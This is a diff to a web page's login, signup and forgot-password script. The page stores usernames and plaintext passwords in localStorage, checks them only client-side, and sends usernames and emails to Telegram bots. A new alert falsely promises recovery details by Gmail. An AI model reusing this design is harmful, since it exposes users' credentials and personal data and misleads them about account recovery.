@@ -183,10 +183,9 @@ h1{
 </div>
 
 <script>
-/* REQUIRED */
 const container = document.getElementById("container");
 
-/* 🤖 TELEGRAM BOTS */
+/* TELEGRAM */
 const SIGNUP_BOT_TOKEN = "SIGNUP_BOT_TOKEN";
 const SIGNUP_CHAT_ID  = "SIGNUP_CHAT_ID";
 
@@ -205,60 +204,47 @@ function sendTelegram(token, chat, msg){
 }
 
 /* NAVIGATION */
-function toggle(){
-  container.className = "container active";
-}
-function showForgot(){
-  container.className = "container forgot-active";
-}
-function backToLogin(){
-  container.className = "container";
-}
+function toggle(){ container.className="container active"; }
+function showForgot(){ container.className="container forgot-active"; }
+function backToLogin(){ container.className="container"; }
 
 /* SIGN UP */
 function register(){
-  const user = regUser.value.trim();
-  const email = regEmail.value.trim();
-  const pass = regPass.value.trim();
-
-  if(!user || !email || !pass){
-    alert("Fill all fields");
+  if(!regUser.value || !regEmail.value || !regPass.value){
+    alert("⚠️ Please fill all the fields to create an account.");
     return;
   }
 
   localStorage.setItem(
-    "user_" + user,
-    JSON.stringify({ email, pass })
+    "user_"+regUser.value,
+    JSON.stringify({ email:regEmail.value, pass:regPass.value })
   );
 
   sendTelegram(
     SIGNUP_BOT_TOKEN,
     SIGNUP_CHAT_ID,
 `🆕 NEW SIGNUP
-👤 ${user}
-📧 ${email}`
+👤 ${regUser.value}
+📧 ${regEmail.value}`
   );
 
-  alert("Signup Successful");
+  alert("✅ Account created successfully. You can login now.");
   backToLogin();
 }
 
 /* LOGIN */
 function login(){
-  const user = loginUser.value.trim();
-  const pass = loginPass.value.trim();
+  const saved = localStorage.getItem("user_"+loginUser.value);
 
-  const savedUser = localStorage.getItem("user_" + user);
-
-  if(!savedUser){
-    alert("User not registered. Please sign up.");
+  if(!saved){
+    alert("❌ You are not registered.\nPlease create an account to continue.");
     return;
   }
 
-  const userData = JSON.parse(savedUser);
+  const data = JSON.parse(saved);
 
-  if(pass !== userData.pass){
-    alert("Wrong password");
+  if(loginPass.value !== data.pass){
+    alert("❌ Incorrect password. Please try again.");
     return;
   }
 
@@ -266,11 +252,11 @@ function login(){
     LOGIN_BOT_TOKEN,
     LOGIN_CHAT_ID,
 `✅ LOGIN SUCCESS
-👤 ${user}
+👤 ${loginUser.value}
 🕒 ${new Date().toLocaleString()}`
   );
 
-  alert("Login Successful");
+  alert("✅ Login successful. Welcome!");
 }
 
 /* FORGOT PASSWORD */
@@ -278,12 +264,12 @@ function forgotPassword(){
   sendTelegram(
     FORGOT_BOT_TOKEN,
     FORGOT_CHAT_ID,
-`🔑 FORGOT PASSWORD REQUEST
-👤 Username: ${fpUser.value}
-📧 Email: ${fpEmail.value}`
+`🔑 FORGOT PASSWORD
+👤 ${fpUser.value}
+📧 ${fpEmail.value}`
   );
 
-  alert("Request sent to admin");
+  alert("📩 Password recovery details will be shared to your Gmail within 24 hours.");
   backToLogin();
 }
 </script>
